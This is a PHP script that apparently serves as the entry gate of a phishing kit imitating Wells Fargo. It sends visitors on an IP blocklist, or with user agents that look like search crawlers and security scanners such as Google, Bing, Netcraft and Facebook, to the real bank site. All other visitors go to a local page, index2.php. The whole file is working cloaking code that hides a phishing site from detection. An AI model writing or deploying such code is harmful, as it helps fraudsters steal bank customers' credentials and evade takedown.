<?php

if(strpos(file_get_contents("ips.txt"),trim($_SERVER['REMOTE_ADDR'])) !== false) {
    header("Location: https://www.wellsfargo.com/");
    exit;
}

$rand = rand(120000,980000);

$checkIfBot = strtolower($_SERVER['HTTP_USER_AGENT']);

if(
    strlen($checkIfBot) <= 74 ||
    strpos($checkIfBot,"bot") !== FALSE ||
    strpos($checkIfBot,"developer") !== FALSE ||
    strpos($checkIfBot,"slurp") !== FALSE ||
    strpos($checkIfBot,"baiduspider") !== FALSE ||
    strpos($checkIfBot,"spider") !== FALSE ||
    strpos($checkIfBot,"ia_archiver") !== FALSE ||
    strpos($checkIfBot,"google") !== FALSE ||
    strpos($checkIfBot,"bing") !== FALSE ||
    strpos($checkIfBot,"slurp") !== FALSE ||
    strpos($checkIfBot,"spider") !== FALSE ||
    strpos($checkIfBot,"msn") !== FALSE ||
    strpos($checkIfBot,"teoma") !== FALSE ||
    strpos($checkIfBot,"simplepie") !== FALSE ||
    strpos($checkIfBot,"facebot") !== FALSE ||
    strpos($checkIfBot,"facebookexternalhit") !== FALSE ||
    strpos($checkIfBot,"netcraftsurveyagent") !== FALSE ||
    strpos($checkIfBot,"apache") !== FALSE

){
    header("Location: https://www.wellsfargo.com/");
    exit;
}else{

    header("Location: ./index2.php ");


}

?>